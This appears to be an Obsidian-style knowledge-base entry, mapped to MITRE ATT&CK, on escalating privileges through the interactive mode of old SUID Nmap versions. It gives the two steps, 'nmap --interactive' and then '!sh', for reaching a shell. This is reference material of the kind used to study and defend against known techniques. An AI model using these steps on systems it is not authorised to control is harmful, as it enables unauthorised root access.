---
id: 0d4aed7e-7950-4010-b10c-ab7beb9f7734
name: Nmap Interactive Mode Shell Escape
type: procedure
verified: false
submitted: false
created_at: '2019-10-09T23:36:48.575743+00:00'
updated_at: '2023-05-29T16:48:53.253841+00:00'
tactics:
- '[[Persistence|TA0003 - Persistence]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Setuid and Setgid|T1166 - Setuid and Setgid]]'
platforms:
- Linux
tags:
- '[[known vulnerability]]'
- '[[shell]]'
commands:
- '[[Nmap Interactive Mode]]'
---

# Nmap Interactive Mode Shell Escape

## Summary

Older versions of Nmap (2.02 to 5.21) include an interactive mode which can allow attackers to escape to a shell. This vulnerability can lead to privilege escalation, as Nmap is occasionally configured with SUID access rights in order for low privilege users access to features requiring root privil

## Description

# Description

Older versions of Nmap (2.02 to 5.21) include an interactive mode which can allow attackers to escape to a shell. This vulnerability can lead to privilege escalation, as Nmap is occasionally configured with SUID access rights in order for low privilege users access to features requiring root privileges.



# Instructions

1. Execute nmap in Interactive Mode





**Command** ([[Nmap Interactive Mode]]):

```bash
nmap --interactive
```



2. At the Nmap prompt, type `!sh` to escape into a shell.



![1e81f234-7720-4144-b7cd-bee5877c6948.png](_assets/images/Mark/1e81f234-7720-4144-b7cd-bee5877c6948.png)



## Platforms

- Linux

## MITRE ATT&CK Mapping

### Tactics

- [[Persistence|TA0003 - Persistence]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Setuid and Setgid|T1166 - Setuid and Setgid]]

## Commands Used

- [[Nmap Interactive Mode]]

## Tags

- [[known vulnerability]]
- [[shell]]


